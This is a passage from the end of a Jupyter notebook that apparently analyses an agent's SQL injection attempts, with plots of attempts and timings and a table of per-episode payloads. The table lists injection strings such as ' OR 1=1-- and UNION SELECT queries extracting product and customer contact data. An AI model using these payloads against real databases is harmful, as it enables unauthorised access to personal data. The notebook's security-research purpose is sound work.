    "analytics.plot_avg_attempts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_context_attempts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_avg_timings()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_context_timings()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "',Context 1,Context 2\\r\\nEpisode 101,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 102,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 103,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 104,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 105,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 106,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 107,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 108,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 109,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 110,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\n'"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = analytics.get_test_payloads()\n",
    "df.to_csv()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Context 1</th>\n",
       "      <th>Context 2</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Episode 101</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 102</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 103</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 104</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 105</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 106</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 107</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 108</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 109</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 110</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                     Context 1  \\\n",
       "Episode 101                                        ' OR 1=1--    \n",
       "Episode 102  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 103  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 104                                        ' OR 1=1--    \n",
       "Episode 105  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 106  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 107  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 108  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 109                                        ' OR 1=1--    \n",
       "Episode 110                                        ' OR 1=1--    \n",
       "\n",
       "                                                     Context 2  \n",
       "Episode 101                                        ' OR 1=1--   \n",
       "Episode 102                                        ' OR 1=1--   \n",
       "Episode 103                                        ' OR 1=1--   \n",
       "Episode 104                                        ' OR 1=1--   \n",
       "Episode 105                                        ' OR 1=1--   \n",
       "Episode 106                                        ' OR 1=1--   \n",
       "Episode 107                                        ' OR 1=1--   \n",
       "Episode 108                                        ' OR 1=1--   \n",
       "Episode 109  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 110                                        ' OR 1=1--   "
      ]
     },
     "execution_count": 72,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total frame counts: 166366\n"
     ]
    }
   ],
   "source": [
    "print(f'Total frame counts: {frame_count}')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "844694dc4390c811ac8b4d2fcaa7d18288efc8c697b009159baa2dd36f994a81"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
